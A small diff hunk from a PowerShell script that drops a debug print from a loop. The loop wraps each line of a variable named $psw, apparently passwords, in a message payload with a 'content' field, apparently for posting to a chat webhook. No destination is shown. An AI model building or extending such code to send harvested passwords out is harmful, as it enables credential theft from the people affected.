@@ -11,7 +11,6 @@ if (![string]::IsNullOrEmpty($content)) {
     if($lines.Length -ne 1) {
         $lines = $lines | Where-Object { $_ -ne "" };
     }
-    Write-Host $lines.Length;
     foreach($psw in $lines) {
         $payload = @{
             content = "```````n$psw`n``````"
